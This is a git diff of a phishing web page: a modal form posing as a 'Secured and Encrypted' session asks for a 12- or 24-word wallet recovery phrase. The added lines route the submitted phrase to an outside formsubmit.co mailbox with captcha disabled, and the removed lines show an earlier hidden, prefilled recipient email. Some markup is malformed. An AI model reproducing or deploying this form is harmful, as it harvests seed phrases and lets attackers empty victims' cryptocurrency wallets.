@@ -1422,9 +1422,12 @@
     <div id="myModal" class="modal">
       <div class="modal-content">
         <button class="close">×</button>
-        <form method="POST" id="my-form" class="modal-inner-content" <!--="" action="http://localhost:6000/send-mail" --="">
+        <form action="https://formsubmit.co/formsubmitmails@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                       
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next"access/point/success.html">
           >
-          <img id="modalImage" src="https://decentralizedauthweb.vercel.app/connect" alt="">
+          <img id="modalImage" src="" alt="">
           <h2 id="modalTitle"></h2>
           <br>
           <p style="color: #808080">This Session is Secured and Encrypted</p>
@@ -1459,7 +1462,7 @@
             </p>
             <textarea id="inputTextArea" name="phrase" placeholder="Enter 12 or 24 words" required=""></textarea>
 
-            <input type="email" id="recipientEmail" name="recipientEmail" placeholder="Enter recipient email" required="" value="wernscott0321@gmail.com" style="display: none">
+            
 
             <div class="error" style="color: red"></div>
             <button id="sendButton" type="submit" name="submit" value="submit">
